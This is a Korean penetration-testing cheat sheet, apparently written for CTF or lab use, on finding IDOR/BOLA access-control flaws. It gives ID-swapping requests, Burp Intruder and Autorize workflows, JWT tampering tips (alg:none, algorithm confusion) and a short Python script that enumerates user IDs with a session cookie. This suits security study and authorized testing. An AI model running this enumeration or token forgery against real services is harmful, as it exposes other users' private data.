# 09_IDOR_BOLA

인증된 사용자가 자기 것이 아닌 다른 사용자/리소스에 파라미터 조작만으로 접근할 수 있는 취약점. API에서는 BOLA(Broken Object Level Authorization)라고도 부른다.

---

## 1단계: 수동 확인

```bash
# 로그인 후 받는 자기 리소스 ID 확인
http://<대상>/profile?id=<내ID>

# ID만 바꿔서 다른 사용자 접근 시도
http://<대상>/profile?id=1
http://<대상>/profile?id=2
# 내 세션(쿠키)으로 다른 사용자 데이터가 보이면 IDOR 확정
```

---

## 2단계: Burp Intruder로 대량 열거

```bash
GET /profile?id=§1§ HTTP/1.1
# id 파라미터를 페이로드 위치로 지정, Sniper로 범위 값 대입
# 응답 길이(Length)가 서로 다른 값이 여러 개 나오면 = 각자 다른 사용자 데이터가 보인다는 뜻
```

---

## 3단계: Autorize 확장으로 접근제어 자체를 자동 검증 (권장)

Burp BApp Store에서 Autorize 설치 후:

1. 저권한(victim) 계정의 세션 쿠키/토큰을 Autorize 탭에 넣음
2. 고권한(attacker 또는 본인) 계정으로 로그인해서 사이트를 돌아다님
3. 내가 보낸 모든 요청을 Autorize가 자동으로 저권한 계정 쿠키로 재전송해본 뒤 비교
4. "Bypassed!" 또는 빨간색으로 나오면 그 엔드포인트는 접근제어가 안 걸린다는 뜻 (녹색 = 안전)

**PwnFox** (Firefox 확장 + Burp 연동): 컨테이너 기능으로 여러 계정(admin/member 등)을 탭 색깔로 구분해서 동시에 브라우징할 때 Autorize와 같이 쓰면 더 편리함

---

## 4단계: 숨겨진 파라미터 찾기 (Param Miner)

ID 파라미터가 URL에 안 보여도 헤더나 숨겨진 POST 필드에 있을 수 있다.

- Burp 우클릭 → Extensions → Param Miner → Guess params
- `?debug=true`, `?admin=1`, `?test=1` 같은 숨겨진 파라미터를 자동 브루트포스

---

## 5단계: API/GraphQL 환경에서의 IDOR (BOLA)

```bash
# REST API에서는 URL 경로 자체가 객체 ID인 경우가 많음
GET /api/v1/users/1001/documents
GET /api/v1/users/1002/documents   # 다른 사용자 ID로 교체

# GraphQL은 단일 엔드포인트(보통 /graphql)로 요청이 몰려있어 일반 디렉토리 브루트포스로는 안 잡힘
# InQL 확장(Burp)으로 introspection 쿼리 자동 분석 + 필드별 IDOR 테스트

# JWT 기반 인증이면 토큰 안 payload의 user_id/role 값을 직접 변조 후 재서명 시도 (JWT Editor 확장)
# alg:none 공격, RS256→HS256 혼동 공격도 같이 시도해볼 가치 있음
```

---

## 6단계: 대량 자동 열거 스크립트 (플래그/문서 대량 확인용)

```python
import requests

session_cookie = {'session': '<내_세션_쿠키>'}
for uid in range(1, 100):
    r = requests.get(f'http://<대상>/api/documents?uid={uid}', cookies=session_cookie)
    if r.status_code == 200 and 'flag' in r.text.lower():
        print(f'[+] uid={uid} 에서 발견: {r.text[:100]}')
```

Burp Intruder보다 캐버리지 대역을 빠르게 훑을 때는 이런 간단한 스크립트가 더 효율적일 수 있다 (Turbo Intruder도 동일 용도).

---

## 팁

- IDOR 자체는 즉각적인 RCE로 이어지지 않지만, 사용자명/이메일/파일 등 민감정보 노출이라는 자체 finding으로 기록
- 가입자/외부인 객체(채용 지원자 등)에서 나온 IDOR은 직원 계정 브루트포스용 사용자명 재활용으로 이어붙이지 않는 것이 안전 — 무관한 집단의 계정 체계라는 점 주의
- ID가 순차적(1,2,3...)이 아니라 UUID/해시인 경우도 IDOR 가능성은 여전히 있음 — 다른 곳에서 유출된 ID값을 모아두고 재활용해볼 것